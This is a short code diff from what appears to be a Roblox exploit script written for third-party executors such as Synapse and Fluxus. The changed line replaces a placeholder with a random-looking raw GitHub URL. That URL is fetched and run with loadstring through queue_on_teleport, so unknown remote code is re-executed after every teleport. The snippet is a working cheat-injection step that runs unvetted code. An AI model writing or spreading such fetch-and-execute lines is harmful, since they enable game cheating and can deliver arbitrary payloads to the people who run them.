@@ -578,7 +578,7 @@ local queue_on_teleport = queue_on_teleport or syn.queue_on_teleport or fluxus.q
 
 if queue_on_teleport then
     queue_on_teleport([[ 
-        loadstring(game:HttpGet("https://your-script-url.com/script.lua"))() 
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/bloxi123/sdfsdgghfdADASFHGFDH/refs/heads/main/sdgimdisakGDHAGs.lua"))() 
     ]])
 else
     warn("Your executor does not support queue_on_teleport.")
